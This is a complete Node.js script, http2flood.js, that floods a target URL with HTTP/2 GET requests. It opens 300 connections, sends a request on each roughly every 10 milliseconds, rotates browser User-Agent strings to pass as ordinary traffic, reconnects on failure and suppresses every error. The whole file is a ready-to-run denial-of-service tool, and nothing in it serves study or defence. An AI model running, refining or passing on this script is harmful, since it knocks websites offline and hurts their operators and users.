const http2 = require('http2');
const fs = require('fs');
const url = require('url');

if (process.argv.length <= 2) {
    console.log("Usage: node http2flood.js <url> <time>");
    process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.hostname;
const time = process.argv[3] * 1000;

// Load User-Agents from ua.txt
let userAgents = [];
try {
    const data = fs.readFileSync('ua.txt', 'utf8');
    userAgents = data.split('\n').filter(ua => ua.trim() !== '');
} catch (err) {
    userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    ];
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

class HTTP2Flooder {
    constructor() {
        this.connections = [];
        this.active = true;
    }

    createConnection() {
        try {
            const client = http2.connect(target);
            this.connections.push(client);
            
            client.on('error', () => {
                const index = this.connections.indexOf(client);
                if (index > -1) {
                    this.connections.splice(index, 1);
                }
                setTimeout(() => this.createConnection(), 50);
            });

            client.on('connect', () => {
                // Start sending requests immediately
                this.sendRequest(client);
            });

            // Continuous request sending
            const interval = setInterval(() => {
                if (client && !client.destroyed && this.active) {
                    this.sendRequest(client);
                } else {
                    clearInterval(interval);
                }
            }, 10); // Increased frequency

        } catch (err) {
            setTimeout(() => this.createConnection(), 100);
        }
    }

    sendRequest(client) {
        if (!client || client.destroyed || !this.active) return;

        try {
            const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
            const req = client.request({
                ':method': 'GET',
                ':path': parsed.path || '/',
                ':authority': host,
                ':scheme': 'https',
                'user-agent': ua,
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br'
            });

            // Minimal event handlers for efficiency
            req.on('response', () => {
                req.close();
            });

            req.on('error', () => {
                req.close();
            });

            req.end();

        } catch (err) {
            // Silent fail
        }
    }

    startFlood() {
        console.log(`Starting HTTP/2 flood to ${target}`);
        
        // Create multiple connections
        for (let i = 0; i < 300; i++) { // Increased connections
            setTimeout(() => this.createConnection(), i * 20);
        }
    }

    stop() {
        this.active = false;
        this.connections.forEach(client => {
            try {
                client.destroy();
            } catch (e) {}
        });
    }
}

// Start the flood
const flooder = new HTTP2Flooder();
flooder.startFlood();

// Stop after specified time
setTimeout(() => {
    flooder.stop();
    process.exit(0);
}, time);

// Handle process termination
process.on('SIGINT', () => {
    flooder.stop();
    process.exit(0);
});